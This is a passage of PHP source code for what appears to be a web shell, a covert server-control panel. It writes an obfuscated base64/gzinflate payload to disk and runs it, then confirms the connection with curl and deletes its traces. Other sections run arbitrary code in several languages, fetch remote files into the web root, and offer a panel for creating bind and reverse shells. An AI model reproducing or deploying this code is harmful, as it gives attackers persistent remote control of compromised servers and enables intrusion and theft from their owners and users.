'.str_replace('#CONNECTION#',$con,gzinflate(base64_decode('3VNNT8JAEL2b8B/G0kCbGLEUWpWUC9HECyR+nMQY3A5SU3ZJt5ga4393lt1CQT1oONlks5mdN++9nc7aWABEYI2LoDsuwlO9B77Vqx3YC5nrXHhCZx7tvlkdigkbtml1V1j5Jg1W5c8qOMUXawyJrTFBqcX06k6/9cDmsaqxGfShFeNriy/TFNr9hgcNBUim4Cj3gXJCO6pKo0wugqk+22KvuAt9y7GxcF14rx0AfXaG6iL3Dz0TY+EoE24ZC8oqEMUfgKnEfTigTm8sWKaorYvWjfRMwzuWs3ZDhV/t7RAEoVHumNjfuFr/Idy4Kbl2acrLVWmYOfdUTpfurys0U3/rChX+465sjetqHGVlSLVQmUc2E2Dd8clTipALwALZMkdgYj6f8NWzVLA4Qe1SPyiZZwshnRcp+CNyJmJ0bOEeQROzTGRNF6IogumEdNxtoZsZ0uscCM6R5RiD4FAfjIbDi8Ht1WhYPxzza5QLwSWegwXHsKPwg/3LSZISmaFN+LO6yW95PwE=')));
            if(Filesman::__save_file($name, $executor)){

                $curl = curl_init($gets);
                curl_setopt($curl, CURLOPT_URL, $gets);
                curl_setopt($curl, CURLOPT_HEADER, false);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

                $result = curl_exec($curl);
                curl_close($curl);

                if(str_contains($result, "Connected")){
                    sleep($GLOBALS['ER0_config']['request_timeout']);
                    $dt = ['file' => 0, 'err' => []];
                    foreach (scandir($tempfolder) as $fl) {
                        if ($fl == '.' || $fl == '..') continue;
                        if (unlink($tempfolder . __DIRECTORY_SEPARATOR__ . $fl)) {
                            $dt['file']++;
                        } else {
                            $dt['err'][] = $fl;
                        }
                    }

                    $returned['status'] = 'success';
                    $returned['detail'] = $result;
                    $returned['update'] = "console.log(`Deleted {$dt['file']} file, and return ".json_encode($dt['err'])."`);";

                    return $returned;
                } else {
                    return $returned;
                }
            } else {
                return $returned;
            }
        }

        $temp_path = $GLOBALS['ER0_string']['temp_dir'];
        $script_name = (!empty($name) ? $name : md5(uniqid()));
        $script_name = ($hidden ? (str_contains($script_name, '.') ? $script_name : '.' . $script_name) : trim($script_name, '.'));
        $script_path = $temp_path . __DIRECTORY_SEPARATOR__ . $script_name;

        if (!file_exists($temp_path)) {
            mkdir($temp_path, 0777, true);
        }

        switch ($exec_with) {
            case 'gcc':
                $final_path = $script_path . '.c';
                break;

            case 'java':
                $final_path = $script_path . '.java';
                break;

            case 'node':
                $final_path = $script_path . '.js';
                break;

            case 'perl':
                $final_path = $script_path . '.pl';
                break;

            case 'php':
                $script = (str_contains($script, '') ? $script : " \n$script");
                $final_path = $script_path . '.php';
                break;

            case 'python':
                $final_path = $script_path . '.py';
                break;

            case 'ruby':
                $final_path = $script_path . '.rb';
                break;

            default:
                $final_path = $script_path;
                break;
        }

        if (!file_exists($final_path)) {
            if (Filesman::__save_file($final_path, $script)) {
                switch ($exec_with) {
                    case 'gcc':
                        $os = $GLOBALS['ER0_string']['sys'];
                        $out = $os == 'win' ? '.exe' : '';
                        $outfile = $script_path . $out;
                        Terminal::__execute("gcc -o $outfile $final_path");

                        if (file_exists($outfile)) {
                            unlink($final_path);
                            if (chmd($outfile)) {
                                $construct_command = "$outfile $args";
                                $con = explode(" ",$args);
                                return ex($temp_path,$script_name,$construct_command,"{$con[1]}:{$con[0]}");
                            } else {
                                return "Error chmod : $outfile";
                            }
                        } else {
                            return "Error compiling C code : $outfile";
                        }

                    default:
                        if (chmd($final_path)) {
                            $dirs = 'cd '.escapeshellarg(dirname($final_path)).';';
                            $files = basename($final_path);
                            $construct_command = "$dirs $exec_with $files $args";
                            $con = explode(" ",$args);
                            return ex($temp_path,$script_name,$construct_command,"{$con[1]}:{$con[0]}");

                        } else {
                            return "Error chmod : $final_path";
                        }
                }
            } else {
                return "Error create file : $final_path";
            }
        }
    }

}
class Upload
{
    /**
     * Print the frontend for html
     * @param string $dir
     */
    public static function __upload_html($dir)
    {
        return
'<!-- FOR MULTIPLE UPLOAD -->
<div class="md:flex gap-2 text-left">
    <div class="w-full">
        <label class="block mb-2 text-sm font-medium  text-foreground" for="multiple_files">Upload multiple files</label>
        <input class="block w-full text-sm text-themecolor-400 border rounded-lg cursor-pointer focus:outline-none focus:ring-primary focus:border-primary bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400" id="multiple_files" type="file" multiple>
    </div>
    <div class="w-auto md:mt-0">
        <label for="path" class="block mb-2 text-sm font-medium text-foreground">Upload Path</label>
        <div class="flex gap-2">
            <select id="path_n" class="p-2.5 bg-themecolor-700 w-auto border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block" >
                <option value="'. Utils::__string_enc($dir) .'" class="text-left">Current Path</option>
                <option value="'. Utils::__string_enc(Request::__server('DOCUMENT_ROOT')) .'" class="text-left">Dir Root Path</option>
            </select>
            <!-- This onclik for get value from input and for optioning -->
            <a onclick="UP(`normal`,`multiple_files`,`path_n`); $(`#multiple_files`).val(``);" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>
        </div>
    </div>
</div>

<!-- FOR REMOTE UPLOAD (get file from url) -->
<div class="md:flex gap-2 mt-4 text-left">
    <div class="w-full">
        <label class="block mb-2 text-sm font-medium  text-foreground" for="file_url">Remote Upload</label>
        <input type="text" id="file_url" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Url to file">
    </div>
    <div class="w-auto md:mt-0">
        <label for="path" class="block mb-2 text-sm font-medium text-foreground">Upload Path</label>
        <div class="flex gap-2">
            <select id="path_r" class="p-2.5 bg-themecolor-700 w-auto border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block" >
                <option value="'. Utils::__string_enc($dir) .'" class="text-left">Current Path</option>
                <option value="'. Utils::__string_enc(Request::__server('DOCUMENT_ROOT')) .'" class="text-left">Dir Root Path</option>
            </select>
            <!-- This onclik for get value from input and for optioning -->
            <a onclick="UP(`remote`,`file_url`,`path_r`); $(`#file_url`).val(``);" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>
        </div>
    </div>
</div>

<!-- FOR STATUS UPLOAD (loading, error, success) -->
<div class="gap-2 text-left">
    <div class="h-auto flex-1">
        <details class="group [&_summary::-webkit-details-marker]:hidden my-4" open>
            <summary class="flex cursor-pointer items-center mb-2 justify-start gap-1.5 rounded-lg text-foreground" >
            <h2 class="font-medium text-sm">Upload Status</h2>
            <svg
                class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"></path>
            </svg>
            </summary>
            <div class="h-auto flex-1 p-2 overflow-auto max-h-[75vh] rounded-lg border bg-themecolor-700 border-themecolor-600">
            <table id="status_table" class="table-auto text-sm w-full text-themecolor-400">

            </table>
            </div>
        </details>
    </div>
</div>'
        ;
    }

    public static function __upload_js()
    {
        if (Session::__check_session()) {

            return
'function UP(option, inputId1, inputId2) {
    let path = $("#" + inputId2).val();
    let files = $("#" + inputId1)[0].files;

    if (option === `normal` && files.length > 0) {
        uploadFiles(files, path);
    } else if (option === `remote`) {
        let url = $("#" + inputId1).val();
        if(url != ""){
            remoteUpload(url, path);
        }
    }
}
function uploadFiles(files, path) {
    let formData = new FormData();
    $.each(files, function (i, file) {
        formData.append(`files[]`, file);
        appendStatusRow(i, file.name);

        // Create a new FormData for each file upload to track progress individually
        let individualFormData = new FormData();
        individualFormData.append(`files[]`, file);
        individualFormData.append(`path`, path);

        $.ajax({
            url: SCRIPT_PATH,
            type: `POST`,
            data: individualFormData,
            processData: false,
            contentType: false,
            xhr: function () {
                let xhr = new window.XMLHttpRequest();
                xhr.upload.addEventListener("progress", function (evt) {
                    if (evt.lengthComputable) {
                        let percentComplete = (evt.loaded / evt.total) * 100;
                        updateProgress(i, percentComplete);
                    }
                }, false);
                return xhr;
            },
            success: function (response) {
                updateStatus(i, response.status[0]);
            },
            error: function () {
                updateStatus(i, `error`);
                console.error(`Upload failed`);
            }
        });
    });
}

function remoteUpload(url, path) {
    var x = document.querySelectorAll(".up_status");
    let id = x.length;
    const urls = new URL(url);
    const filename = urls.pathname.split("/").pop();

    appendStatusRow(id, filename);
    $.post(SCRIPT_PATH, { upload_option: `R_UPLOAD`,url: url, path: path }, function (response) {
        if (response.status === `success`) {
            updateProgress(id, 100);
            updateStatus(id, `success`);
        } else {
            updateProgress(id, 100);
            updateStatus(id, `error`);
        }
    }, `json`);
}
function appendStatusRow(id, fileName) {
    let row = `
        <tr id="upload_row_${id}" class="up_status">
            <td class="py-1 w-8 text-center">${id + 1}</td>
            <td class="w-24 pr-2"><div class="truncate w-24">${fileName}</div></td>
            <td>
                <div class="w-full rounded-full bg-themecolor-800">
                    <div id="upload${id}_progress" class="bg-primary text-xs font-medium text-center p-0.5 leading-none rounded-full" style="width: 5%">
                        <span id="upload${id}_percent" class="text-foreground">0%</span>
                    </div>
                </div>
            </td>
            <td id="upload${id}_status" class="w-8 text-center">
                <i class="bx bx-loader-alt text-sm animate-spin text-primary"></i>
            </td>
        </tr>`;
    $("#status_table").append(row);
}
function updateProgress(id, percent) {
    $("#upload" + id + "_progress").css("width", percent + "%");
    $("#upload" + id + "_percent").text(Math.round(percent) + "%");
}
function updateStatus(id, status) {
    let statusIcon = {
        "success": `<i class="bx bx-check-circle text-sm text-themecolor-green"></i>`,
        "error": `<i class="bx bx-x-circle text-sm text-themecolor-red"></i>`
    };
    $colors = statusIcon[status] == "error" ? "bg-themecolor-red" : "bg-themecolor-green";
    $texts = statusIcon[status] == "error" ? "ERROR" : "";
    $("#upload" + id + "_progress").addClass($colors);
    $("#upload" + id + "_percent").text($texts);
    $("#upload" + id + "_status").html(statusIcon[status]);
}'
            ;
        }
    }

    public static function __upload_function()
    {

        if (isset($_FILES['files']) && isset(${"_POST"}['path'])) {
            $response = [];
            $targetDir = Utils::__string_dec(Request::__post_request('path'));
            $targetDir = rtrim($targetDir, __DIRECTORY_SEPARATOR__) . __DIRECTORY_SEPARATOR__;

            if (!empty($_FILES['files']['name'][0])) {
                foreach ($_FILES['files']['name'] as $key => $val) {
                    $targetFilePath = $targetDir . basename($_FILES['files']['name'][$key]);

                    if ($_FILES['files']['error'][$key] === UPLOAD_ERR_OK) {
                        if (move_uploaded_file($_FILES['files']['tmp_name'][$key], $targetFilePath)) {
                            $response['status'][$key] = 'success';
                        } else {
                            $response['status'][$key] = 'error';
                        }
                    } elseif ($_FILES['files']['error'][$key] === UPLOAD_ERR_INI_SIZE || $_FILES['files']['error'][$key] === UPLOAD_ERR_FORM_SIZE) {
                        $response['status'][$key] = 'error';
                        $response['message'][$key] = 'File size exceeds the limit.';
                    } else {
                        $response['status'][$key] = 'error';
                        $response['message'][$key] = 'File upload error.';
                    }
                }
            } else {
                $response = ['status' => 'error', 'message' => 'No files uploaded or file too large.'];
            }

            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }

        if (isset(${"_POST"}['upload_option'])) {
            if (Request::__post_request('upload_option') == 'R_UPLOAD' && isset(${"_POST"}['path'])) {
                $url = Request::__post_request('url');
                $path = Utils::__string_dec(Request::__post_request('path'));
                $path = rtrim($path, __DIRECTORY_SEPARATOR__) . __DIRECTORY_SEPARATOR__;
                $fileName = basename($url);
                $targetFilePath = $path . $fileName;

                if (Filesman::__save_from_url($url, $targetFilePath)) {
                    $response = ['status' => 'success'];
                } else {
                    $response = ['status' => 'error', 'message' => 'Failed to upload file or file too large.'];
                }
                header('Content-Type: application/json');
                echo json_encode($response);
                exit();
            }
        }
    }
}
class Zipper
{


    /**
     * Print the frontend for html
     * @param string $dir
     */
    public static function __zip_html($dir)
    {
        $src =  $GLOBALS['ER0_config']['show_fullpath'] ? $dir : '';
        $dst =  $GLOBALS['ER0_config']['show_fullpath'] ? $dir : basename($dir);

        return
'<div class="md:flex gap-2 text-left">
    <div class="w-full">
        <label for="dirname" class="block mb-2 text-sm font-medium text-foreground">Folder Source</label>
        <input type="text" id="dirname" onkeyup="$(`#zipdestination`).val($(this).val() + `_` + (Math.floor(Math.random() * (99999 - 10000)) + 10000) +`.zip`)" value="'. $dst .'" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Path Source">
    </div>
    <div class="w-full mt-4 md:mt-0">
        <label for="zipdestination" class="block mb-2 text-sm font-medium text-foreground">Zip Destination</label>
        <div class="flex gap-2">
            <input type="text" id="zipdestination" value="'. $dst .'_'. rand(10000, 99999) .'.zip" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Zip Destination | path/to/zip/file.zip">
            <a onclick="S(`'. Utils::__charcode_enc('{"0": "dirname", "1": "zipdestination"}') .'`)" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>

        </div>
    </div>
</div>
<div class="md:flex gap-2 mt-4 text-left">
    <div class="w-full">
        <label for="zipname" class="block mb-2 text-sm font-medium text-foreground">Zip Source</label>
        <input type="text" id="zipname" onkeyup="x=$(this).val(); $(`#extractdestination`).val(x.replace(/\.[^/.]+$/, ``));" value="'. $src .'" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Zip file">
    </div>
    <div class="w-full mt-4 md:mt-0">
        <label for="extractdestination" class="block mb-2 text-sm font-medium text-foreground">Extract Destination</label>
        <div class="flex gap-2">
            <input type="text" id="extractdestination" value="'. $dst .'" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="path/to/folder">
            <a onclick="S(`'. Utils::__charcode_enc('{"0": "zipname", "1": "extractdestination"}') .'`)" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>

        </div>
    </div>
</div>'
        ;
    }

    /**
     * Create zip from folder/bulk array
     * @param string $source
     * @param string $destination
     * @param string $action
     * @return array [status, files, folders, errors]
     */
    public static function __create_zip($source, $destination, $action = null)
    {
        $result = [
            'status' => false,
            'files' => 0,
            'folders' => 0,
            'errors' => []
        ];

        if (!extension_loaded('zip')) {
            $result['errors'][] = 'ZIP extension is not loaded.';
            return $result;
        }

        // Handle the bulk action separately
        if ($action === 'bulk') {
            $array = json_decode(Utils::__charcode_dec($source), true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                $result['errors'][] = "Error when decoding array!";
                return $result;
            }

            $zip = new ZipArchive();
            if (!$zip->open($destination, ZipArchive::CREATE)) {
                $result['errors'][] = 'Failed to create ZIP archive.';
                return $result;
            }

            foreach ($array as $fileEntry) {
                $file = Utils::__string_dec($fileEntry['file']);
                $index = isset($fileEntry['index']) ? $fileEntry['index'] : null;

                if (file_exists($file)) {
                    $file = realpath($file);
                    $sourceBaseName = basename($file);
                    $parentDir = dirname($file);

                    // Change the working directory to the parent of the source directory
                    chdir($parentDir);

                    if (is_dir($file)) {
                        $result['folders']++;

                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sourceBaseName), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($files as $file) {
                            $file = str_replace('\\', __DIRECTORY_SEPARATOR__, $file);
                            if (in_array(substr($file, strrpos($file, __DIRECTORY_SEPARATOR__) + 1), array('.', '..'))) continue;
                            if (is_dir($file)) {
                                $zip->addEmptyDir($file);
                                $result['folders']++;
                            } elseif (is_file($file)) {
                                $zip->addFile($file, $file);
                                $result['files']++;
                            }
                        }
                    } else {
                        if ($index !== null) {
                            $zip->addFile($file, $index);
                            $result['files']++;
                        } else {
                            $zip->addFile($file, basename($file));
                            $result['files']++;
                        }
                    }
                } else {
                    $result['errors'][] = "File $file does not exist.";
                }
            }

            if ($zip->close()) {
                $result['status'] = true;
            } else {
                $result['errors'][] = 'Failed to close ZIP archive.';
            }

            return $result;
        }

        if (!file_exists($source)) {
            $result['errors'][] = 'Source file or directory does not exist.';
            return $result;
        }

        // Ensure the destination directory exists
        $destinationDir = dirname($destination);
        if (!is_dir($destinationDir)) {
            if (!mkdir($destinationDir, 0755, true)) {
                $result['errors'][] = 'Failed to create destination directory.';
                return $result;
            }
        }

        $zip = new ZipArchive();
        if (!$zip->open($destination, ZipArchive::CREATE)) {
            $result['errors'][] = 'Failed to create ZIP archive.';
            return $result;
        }

        $source = realpath($source);
        $sourceBaseName = basename($source);
        $parentDir = dirname($source);

        // Change the working directory to the parent of the source directory
        chdir($parentDir);

        if (is_dir($source)) {
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sourceBaseName), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($files as $file) {
                $file = str_replace('\\', __DIRECTORY_SEPARATOR__, $file);
                if (in_array(substr($file, strrpos($file, __DIRECTORY_SEPARATOR__) + 1), array('.', '..'))) continue;
                if (is_dir($file)) {
                    $zip->addEmptyDir($file);
                    $result['folders']++;
                } elseif (is_file($file)) {
                    $zip->addFile($file, $file);
                    $result['files']++;
                }
            }
        } elseif (is_file($source)) {
            $zip->addFile($sourceBaseName, basename($source));
            $result['files']++;
        }

        if ($zip->close()) {
            $result['status'] = true;
        } else {
            $result['errors'][] = 'Failed to close ZIP archive.';
        }

        return $result;
    }

    /**
     * Extract archive from archive file/bulk array
     * @param string $source
     * @param string $destination
     * @return array [status, files, folders, errors]
     */
    public static function __extract_archive($source, $destination)
    {
        $result = [
            'status' => false,
            'files' => 0,
            'folders' => 0,
            'errors' => []
        ];

        if (!file_exists($source)) {
            $result['errors'][] = 'Source archive file does not exist.';
            return $result;
        }

        if (!is_dir($destination) && !mkdir($destination, 0755, true)) {
            $result['errors'][] = 'Failed to create destination directory.';
            return $result;
        }

        $ext = pathinfo($source, PATHINFO_EXTENSION);

        switch ($ext) {
            case 'zip':
                $result = self::__extract_zip($source, $destination, $result);
                break;
            case 'tar':
            case 'gz':
                $result = self::__extract_tar($source, $destination, $result);
                break;
            case 'rar':
                $result = self::__extract_rar($source, $destination, $result);
                break;
            case '7z':
                $result = self::__extract_7z($source, $destination, $result);
                break;
            default:
                $result['errors'][] = 'Unsupported archive format.';
        }

        return $result;
    }

    private static function __extract_zip($source, $destination, $result)
    {
        if (!extension_loaded('zip')) {
            $result['errors'][] = 'ZIP extension is not loaded.';
            return $result;
        }

        $zip = new ZipArchive();
        if ($zip->open($source) === TRUE) {
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $stat = $zip->statIndex($i);
                if (substr($stat['name'], -1) == __DIRECTORY_SEPARATOR__) {
                    $result['folders']++;
                } else {
                    $result['files']++;
                }
            }
            $zip->extractTo($destination);
            $zip->close();
            $result['status'] = true;
        } else {
            $result['errors'][] = 'Failed to open ZIP archive.';
        }

        return $result;
    }

    private static function __extract_tar($source, $destination, $result)
    {
        $command = "tar -xf \"$source\" -C \"$destination\"";

        if (!empty(Terminal::__execute($command))) {
            // Count files and folders extracted
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($destination), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($files as $file) {
                if ($file->isDir()) {
                    $result['folders']++;
                } else {
                    $result['files']++;
                }
            }
            $result['status'] = true;
        } else {
            $result['errors'][] = 'Failed to extract TAR archive.';
        }
        return $result;
    }

    private static function __extract_rar($source, $destination, $result)
    {
        $command = "unrar x \"$source\" \"$destination\"";
        if (!empty(Terminal::__execute($command))) {
            // Count files and folders extracted
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($destination), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($files as $file) {
                if ($file->isDir()) {
                    $result['folders']++;
                } else {
                    $result['files']++;
                }
            }
            $result['status'] = true;
        } else {
            $result['errors'][] = 'Failed to extract RAR archive.';
        }
        return $result;
    }

    private static function __extract_7z($source, $destination, $result)
    {
        $command = "7z x \"$source\" -o\"$destination\"";
        if (!empty(Terminal::__execute($command))) {
            // Count files and folders extracted
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($destination), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($files as $file) {
                if ($file->isDir()) {
                    $result['folders']++;
                } else {
                    $result['files']++;
                }
            }
            $result['status'] = true;
        } else {
            $result['errors'][] = 'Failed to extract 7z archive.';
        }
        return $result;
    }
}
class Network
{
    public static function __network_html($dir)
    {
        $optionHtml = '';
        $warning = '';
        $disable = '';
        $disableClass = '';
        if (Terminal::__check_execute(true)) {
            foreach ($GLOBALS['ER0_array']['program_lang'] as $lang => $label) {
                $check = Terminal::__execute("$lang --help");
                if (!empty($check) && !strpos($check, 'not found')) {
                    $optionHtml .= '<option value="' . Utils::__string_enc($lang) . '" class="text-left">' . $label . '</option>';
                }
            }
        } else {
            $warning = 'Cannot execute command!';
            $disable = 'disabled readonly';
            $disableClass = 'cursor-not-allowed pointer-events-none';
        }

        $data_config = array(
            'data' => ["network"],
            'dir' => $dir,
            'hiddenVal' => ['f', 'n', 't', 'u', 'pw'],
            'titleHref' => null,
            'action' => [[['button', 'connectionId'], 'use_hidden', 'bind', 'NET'], [['button', 'commandId'], 'copy', 'copy cmd'], ['button', 'kill', 'kill'], ['button', 'delete', 'delete']],
            'jsonKey' => [['EMPTY', ['input', 'disabled'], 'proccessId'], 't', 'u', 'pw', ['con', ['input', 'disabled'], 'connectionId'], ['cmd', ['input', 'disabled'], 'commandId']],
            'statusKey' => ['path' => 'f', 'file' => 'n'],
            'showStatus' => false,
            'rowStyle' => ['EMPTY' => ['font-normal', 'text-themecolor-400'], 't' => ['font-normal', 'text-themecolor-orange'], 'pw' => [['font-bold', 'ifNot=none'], ['text-themecolor-green', 'ifNot=none']], 'con' => ['font-normal', 'text-themecolor-400'], 'cmd' => ['font-bold', 'text-themecolor-400']],
            'tableHeader' => ['Proccess', 'Type', 'Use', 'Password', 'Connection', 'Connect CMD'],
            'return' => 'table'
        );

        return
'<div class="grid md:grid-cols-2 gap-2 gap-x-5 text-left">
    <div class="grid gap-2 text-center">
        <span class="block mb-2 text-sm font-medium text-foreground">Bind Shell</span>

        <div class="relative flex text-foreground justify-start items-center w-full gap-2">
            <label for="bind_port" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">port</label>
            <label for="bind_port" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[3rem] text-sm font-medium text-themecolor-400">:</label>
            <input '. $disable .' type="text" id="bind_port" value="'. (!empty($warning) ? $warning : rand(10000, 65535)) .'" class="'. $disableClass .' block pt-2.5 ps-[4.5rem] text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Port">
        </div>

        <div class="relative flex text-foreground justify-start items-center w-full gap-2">
            <label for="bind_pass" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">pass</label>
            <label for="bind_pass" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[3rem] text-sm font-medium text-themecolor-400">:</label>
            <input '. $disable .' type="text" id="bind_pass" value="'. (!empty($warning) ? $warning : Utils::__random_string()) .'" class="'. $disableClass .' block pt-2.5 ps-[4.5rem] text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Password">
        </div>

        <div class="flex gap-2 w-full text-left">
            <div class="relative flex h-8 bg-themecolor-700 w-full border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded-lg">
                <label for="bind_use" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">use</label>
                <label for="bind_use" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[3rem] text-sm font-medium text-themecolor-400">:</label>
                <select '. $disable .' id="bind_use" class="'. $disableClass .' pl-2 h-7 bg-themecolor-700 border-none w-full placeholder-themecolor-400 ms-[4rem] text-foreground text-sm focus:ring-0 focus:border-none block" >
                 '. $optionHtml .'
                </select>
            </div>
            <a '. $disable .' onclick="NET(`bind`)" action="'. $GLOBALS['ER0_string']['filesman'] .'" class="'. $disableClass .' text-sm h-8 cursor-pointer font-medium inline-flex items-center rounded-lg w-auto text-foreground bg-themecolor-700 hover:bg-primary hover:border-primary px-2 border border-themecolor-600">Create</a>
        </div>
    </div>

    <div class="grid gap-2 text-center">
        <span class="block mb-2 text-sm font-medium text-foreground">Reverse Shell</span>

        <div class="relative flex text-foreground justify-start items-center w-full gap-2">
            <label for="reverse_ip" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">ip</label>
            <label for="reverse_ip" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[3rem] text-sm font-medium text-themecolor-400">:</label>
            <input '. $disable .' type="text" id="reverse_ip" value="'. (!empty($warning) ? $warning : Request::__server('REMOTE_ADDR')) .'" class="'. $disableClass .' block pt-2.5 ps-[4.5rem] text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Port">
        </div>

        <div class="relative flex text-foreground justify-start items-center w-full gap-2">
            <label for="reverse_port" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">port</label>
            <label for="reverse_port" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[3rem] text-sm font-medium text-themecolor-400">:</label>
            <input '. $disable .' type="text" id="reverse_port" value="'. (!empty($warning) ? $warning : rand(10000, 65535)) .'" class="'. $disableClass .' block pt-2.5 ps-[4.5rem] text-sm border rounded-lg w-full bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary" placeholder="Password">
        </div>

        <div class="flex gap-2 w-full text-left">
            <div class="relative flex h-8 bg-themecolor-700 w-full border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded-lg">
                <label for="reverse_use" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-3 text-sm font-medium text-themecolor-400">use</label>
                <label for="reverse_use" class="absolute inset-y-0 rtl:inset-r-0 start-0 flex items-center ps-[3rem] text-sm font-medium text-themecolor-400">:</label>
                <select '. $disable .' id="reverse_use" class="'. $disableClass .' pl-2 h-7 bg-themecolor-700 border-none w-full placeholder-themecolor-400 ms-[4rem] text-foreground text-sm focus:ring-0 focus:border-none block" >
                 '. $optionHtml .'
                </select>
            </div>
            <a '. $disable .' onclick="NET(`reverse`)" action="'. $GLOBALS['ER0_string']['filesman'] .'" class="'. $disableClass .' text-sm h-8 cursor-pointer font-medium inline-flex items-center rounded-lg w-auto text-foreground bg-themecolor-700 hover:bg-primary hover:border-primary px-2 border border-themecolor-600">Create</a>
        </div>
    </div>
</div>

<div class="relative overflow-auto pt-4 text-left w-full">
    <details class="group [&_summary::-webkit-details-marker]:hidden my-4" open>
        <summary class="text-foreground flex cursor-pointer items-center justify-start mb-2 gap-1.5 rounded-lg" >
        <h2 class="font-medium text-sm grid lg:flex">Network history data</h2>
        <svg
            class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"></path>
        </svg>
        </summary>
        <div class="h-auto flex-1 overflow-auto max-h-[75vh] rounded-lg border bg-themecolor-700 border-themecolor-600">
            '. Utils::__get_data($data_config) .'
        </div>
    </details>
</div>

<script>
$(`#tools_container`).addClass(`overflow-auto`);
</script>'
        ;
    }

    public static function __network_js()
    {
        if (Session::__check_session()) {
            return
'function NET(type, optional = null){
    ip = ``;
    port = ``;
    pass = ``;
    use = ``;
    dataRaw = ``;
    nmf = ``;
    indx = ``;
    timeouts = '. $GLOBALS['ER0_config']['request_timeout'] . '000'.';

    if(type == `bind`){
        ip = `none`;
        port = $(`#bind_port`).val();
        pass = $(`#bind_pass`).val();
        use = $(`#bind_use`).val();

    } else if (type == `reverse`) {

        ip = $(`#reverse_ip`).val();
        port = $(`#reverse_port`).val();
        pass = `none`;
        use = $(`#reverse_use`).val();
    } else {
        dataRaw = type;
        // console.log(charcodeDec(type));

        type = `none`;
        ip = `none`;
        port = `none`;
        pass = `none`;
        use = `none`;

    }

    params = getParams();

    var DATA = {
        "key": "NETWORK",
        "dir": params[`dir`],
        "type": charcodeEnc(type),
        "ip": charcodeEnc(ip),
        "port": charcodeEnc(port),
        "pass": charcodeEnc(pass),
        "use": charcodeEnc(use),
        "dataRaw" : dataRaw
    };

    if(dataRaw != ``){
        RWS = JSON.parse(charcodeDec(dataRaw));
        strs = RWS[1].added;
        indx = RWS[1].index;
        strs = strs.split(":");
        // console.log(RWS);

        rawDetails = ``;

        if(RWS[0].t == `reverse`){
            rawDetails = `Reverse shell connected to ${strs[0]}:${strs[1]}`;
            rawDetailsFail = `Failed connecting reverse shell to ${strs[0]}:${strs[1]}`;
        } else {
